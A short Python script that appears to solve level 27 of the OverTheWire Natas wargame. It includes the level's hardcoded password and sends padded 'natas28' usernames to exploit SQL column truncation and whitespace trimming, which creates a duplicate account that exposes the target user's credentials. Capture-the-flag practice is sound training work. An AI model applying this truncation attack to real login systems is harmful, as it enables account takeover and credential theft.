import requests
from requests.auth import HTTPBasicAuth
import time
ps27 = 'u3RRffXjysjgwFU6b9xa23i6prmUsYne'
user = 'natas27'
basicAuth=HTTPBasicAuth(user,ps27)
url= "http://natas27.natas.labs.overthewire.org/" 
session = requests.Session()
data ={
    'username' : 'natas28'+" "*58+'a',
    'password' : 'afd'
}
r = session.post(url,data=data,auth=basicAuth)
print(r.text)
data ={
    'username' : 'natas28'+' '*57,
    'password' : 'afd'
}
time.sleep(10)
r = session.post(url,data=data,auth=basicAuth)
print(r.text)
